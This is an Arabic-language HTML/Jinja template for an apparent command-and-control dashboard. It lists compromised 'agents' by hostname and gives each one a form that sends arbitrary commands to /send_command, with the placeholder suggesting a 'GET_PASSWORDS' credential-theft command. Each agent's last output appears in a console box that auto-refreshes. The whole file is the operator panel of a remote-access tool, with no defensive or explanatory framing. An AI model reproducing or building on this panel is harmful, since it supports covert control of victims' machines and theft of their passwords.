<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>Dashboard</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>body{background:#0f172a;color:white;}.card{background:#1e293b;border:none;margin-top:20px;}pre{background:black;color:#0f0;padding:15px;}</style>
</head>
<body class="container py-5">
    <div class="d-flex justify-content-between mb-4">
        <h2>لوحة التحكم بالأجهزة</h2>
        <a href="/logout" class="btn btn-danger">خروج</a>
    </div>
    <div class="row">
        {% for id, info in agents.items() %}
        <div class="col-md-12">
            <div class="card p-4">
                <h4>الجهاز: {{ info.system.hostname }} <span class="badge bg-success">متصل</span></h4>
                <form action="/send_command" method="post" class="my-3">
                    <input type="hidden" name="agent_id" value="{{ id }}">
                    <div class="input-group">
                        <input type="text" name="command" class="form-control" placeholder="اكتب الأمر أو GET_PASSWORDS">
                        <button class="btn btn-primary">تنفيذ</button>
                    </div>
                </form>
                <h6>النتائج:</h6>
                <pre>{{ info.last_result if info.last_result else "في انتظار الأوامر..." }}</pre>
            </div>
        </div>
        {% endfor %}
    </div>
    <script>setInterval(()=>{location.reload();}, 15000);</script>
</body>
</html>
